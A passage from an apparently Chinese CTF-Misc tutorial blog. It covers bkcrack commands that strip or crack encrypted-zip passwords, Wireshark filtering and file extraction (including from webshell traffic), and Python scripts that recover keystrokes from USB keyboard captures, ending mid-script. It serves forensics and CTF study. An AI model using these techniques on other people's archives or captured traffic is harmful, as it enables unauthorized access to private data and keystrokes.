start="4"><li>去除加密压缩包的密码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-U</span> 去除加密后的压缩包文件路径 指定新的解压密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB13.png" alt="CTF-Misc_明文攻击13.png"></p><p>使用上述命令，在 <code>~/Desktop.zip</code> 同目录下会生成一个新的压缩包 <code>unlocked.zip</code>，解压密码为 <code>123456</code>，压缩包内容与 <code>~/Desktop.zip</code> 一模一样</p><ol start="5"><li>根据密钥 key 尝试还原出密码（<em>太耗时，不建议也没必要</em>）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-r</span> 密码长度 ?参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>密码长度为 <code>16</code> 时，尝试 1 - 16 位密码；密码长度为 <code>11..13</code> 时，尝试 11 - 13 位密码</p></li><li><p>参数为 <code>a</code> 代表所有字符，<code>p</code> 代表可打印字符，<code>d</code> 代表数字，<code>l</code> 代表小写字母，<code>u</code> 代表大写字母，<code>d/l</code> 代表数字和小写字母，<code>d/l/u</code> 代表数字、小写字母和大写字母</p></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析</title>
      <link href="/posts/f7dcf1b6.html"/>
      <url>/posts/f7dcf1b6.html</url>
      
        <content type="html"><![CDATA[<h1 id="pcap-流量包修复"><a href="#pcap-流量包修复" class="headerlink" title="pcap 流量包修复"></a>pcap 流量包修复</h1><blockquote><p>如果打开流量包出现异常现象，例如：<code>&quot;The capture file appears to be damaged or corrupt.&quot;</code>，说明流量包损坏，需要修复</p></blockquote><p>在线修复工具：<a href="https://f00l.de/hacking/pcapfix.php">pcapfix - online pcap &#x2F; pcapng repair service</a></p><p>上述网站修复完毕后，点击 <code>&quot;Get your repaired PCAP-file here.&quot;</code> 即可下载流量包</p><hr><h1 id="Wireshark-的使用"><a href="#Wireshark-的使用" class="headerlink" title="Wireshark 的使用"></a>Wireshark 的使用</h1><blockquote><p>Wireshark 是用来分析 pcap、pcapng 流量包的网络嗅探器，通常数据包里充满着大量无关的流量信息，因此对流量数据进行分类和过滤十分重要</p><p>Wireshark 下载地址：<a href="https://www.wireshark.org/download.html">wireshark.org</a></p><p>参考文献：</p><ol><li><a href="https://www.freebuf.com/sectool/199838.html">CTF流量分析之wireshark使用 - FreeBuf网络安全行业门户</a></li><li><a href="https://forum.butian.net/share/1958">奇安信攻防社区-CTF流量分析</a></li></ol></blockquote><p>Wireshark 的使用主要分为<strong>数据包筛选</strong>、<strong>数据包搜索</strong>、<strong>数据包还原</strong>、<strong>数据提取</strong>四部分</p><h2 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h2><p>Wireshark 支持的各类运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">等于</td></tr><tr><td align="left">!&#x3D;</td><td align="left">不等于</td></tr><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于</td></tr><tr><td align="left">and、&amp;&amp;</td><td align="left">与</td></tr><tr><td align="left">or、||</td><td align="left">或</td></tr><tr><td align="left">xor、^^</td><td align="left">异或</td></tr><tr><td align="left">not、!</td><td align="left">非</td></tr></tbody></table><hr><h3 id="IP-地址筛选"><a href="#IP-地址筛选" class="headerlink" title="IP 地址筛选"></a>IP 地址筛选</h3><ol><li>筛选源 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.src <span class="token operator">==</span> 源ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.dst <span class="token operator">==</span> 目的ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选所有源 ip 地址或目的 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.addr <span class="token operator">==</span> ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选除源 ip 地址以外的所有 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not ip.src <span class="token operator">==</span> 源ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="MAC-地址筛选"><a href="#MAC-地址筛选" class="headerlink" title="MAC 地址筛选"></a>MAC 地址筛选</h3><ol><li>筛选源 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.dst <span class="token operator">==</span> 源MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.src <span class="token operator">==</span> 目的MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选所有源 MAC 地址或目的 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.addr <span class="token operator">==</span> MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h3><ol><li>筛选 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选 http 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选 arp&#x2F;icmp&#x2F;ftp&#x2F;dns&#x2F;ip 协议流量，同理</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp/icmp/ftp/dns/ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选 http 协议或 icmp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http or icmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h3><ol><li>筛选源端口为 80 端口的 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的端口为 80 端口的 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选源端口为 80 端口的 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选目的端口为 80 端口的 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选源端口或目的端口为 80 端口的所有 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>筛选源端口或目的端口为 80 端口的所有流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span> or udp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>筛选端口范围为 1 ~ 80 端口的所有 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">>=</span> <span class="token number">1</span> and tcp.port <span class="token operator">&lt;=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="数据包长度筛选"><a href="#数据包长度筛选" class="headerlink" title="数据包长度筛选"></a>数据包长度筛选</h3><ol><li>筛选长度为 20 的 tcp 协议流量数据包（不包括 tcp 本身，tcp 下面那块数据包长度）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.length <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选长度大于 20 的 udp 协议流量数据包（udp 本身固定长度 8 与 udp 下面那块数据包长度之和）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.length <span class="token operator">>=</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选长度为 20 的整个流量数据包（从 eth 开始到最后）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frame.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选长度为 20 的 ip 流量包</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="HTTP-请求筛选"><a href="#HTTP-请求筛选" class="headerlink" title="HTTP 请求筛选"></a>HTTP 请求筛选</h3><ol><li>筛选 http 请求方法为 get 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"GET"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选 http 请求方法为 post 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"POST"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选 http 请求 URL 为 <code>/img/flag.gif</code> 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.uri <span class="token operator">==</span> <span class="token string">"/img/flag.gif"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选 http 请求内容包含 <code>flag</code> 的流量（contains 仅支持一个）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http contains <span class="token string">"flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选 http 请求内容包含 <code>ctf</code> 或 <code>flag</code> 的流量（matches 支持多个）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http matches <span class="token string">"ctf|flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h2><blockquote><p>Wirshark 使用快捷键 “Ctrl + F”可以进行关键字搜索</p></blockquote><p>支持十六进制、字符串和正则表达式等方式，字符串搜索比较常用</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901.png" alt="CTF-Misc_流量分析1.png"></p><p>搜索栏左侧可以选择分组列表、分组详情和分组字节流，分别对应搜索 Wireshark 界面的三个不同区域</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.png" alt="CTF-Misc_流量分析2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%903.png" alt="CTF-Misc_流量分析3.png"></p><hr><h2 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h2><blockquote><p>Wireshark 可以通过追踪流将 http 或 tcp 流量集合在一起并还原成原始数据</p></blockquote><p>选中一个流量包，右键追踪流：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%904.png" alt="CTF-Misc_流量分析4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%907.png" alt="CTF-Misc_流量分析7.png"></p><hr><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><blockquote><p>Wireshark 支持提取通过 http 传输（上传&#x2F;下载）的文件内容</p></blockquote><ol><li>在菜单栏的文件选项中，选择 <code>导出对象 --&gt; HTTP</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%905.png" alt="CTF-Misc_流量分析5.png"></p><p>选择想要导出的文件，点击保存即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%906.png" alt="CTF-Misc_流量分析6.png"></p><ol start="2"><li>在分组详情窗口中，选择要导出的对象，<code>右键 --&gt; 导出分组字节流</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%908.png" alt="CTF-Misc_流量分析8.png"></p><blockquote><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的 <code>X@Y</code> 字符，否则下载的文件会出错</p></blockquote><p>首先在分组详情窗口中，选择要导出的对象，<code>右键 --&gt; 显示分组字节</code></p><p>然后在弹出的窗口中设置开始和结束的字节（<em>原字节数开头加 3，结尾减 3</em>），导出保存</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%909.png" alt="CTF-Misc_流量分析9.png"></p><hr><h1 id="USB-流量"><a href="#USB-流量" class="headerlink" title="USB 流量"></a>USB 流量</h1><blockquote><p>USB 流量数据存放在 <code>Leftover Capture Data</code> 域中，可在 Wireshark 的分组详情窗口中查看</p><p>可参考的工具：<a href="https://github.com/FzWjScJ/knm">FzWjScJ&#x2F;knm: 鼠标键盘流量包取证</a></p><p>参考文献：<a href="https://cloud.tencent.com/developer/article/2036237">CTF流量分析常见题型(二)-USB流量-腾讯云开发者社区-腾讯云</a></p></blockquote><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><blockquote><p><strong>键盘流量的数据长度为 8 个字节</strong>，集中在 <code>Leftover Capture Data</code> 域的第 3 个字节中</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9010.png" alt="CTF-Misc_流量分析10.png"></p><p>在 Kali Linux 下通过 <code>tshark</code> 命令将键盘数据提取出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#提取并去除空行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>Kali Linux 自带 tshark，Ubuntu 则需要手动安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update  <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> tshark<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><em>提取出来的数据有冒号时，[6:8] 代表键盘击键信息；没有冒号时，[4:6] 代表键盘击键信息</em></p><p>加了冒号的数据类似于：<code>00:00:03:00:00:00:00:00</code>，如果提取出来的数据不带冒号，可以通过脚本添加冒号：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token comment"># 如果是鼠标流量 len 改为 8</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据加了冒号的键盘数据，使用脚本一和脚本二还原击键信息</p><p>脚本一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mappings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0x04</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token number">0x0E</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span>    <span class="token number">0x0F</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span>    <span class="token number">0x19</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span>    <span class="token number">0x1A</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>    <span class="token number">0x24</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span>    <span class="token number">0x25</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span> <span class="token string">"[DEL]"</span><span class="token punctuation">,</span> <span class="token number">0X2B</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span>    <span class="token number">0x30</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">&#125;</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span 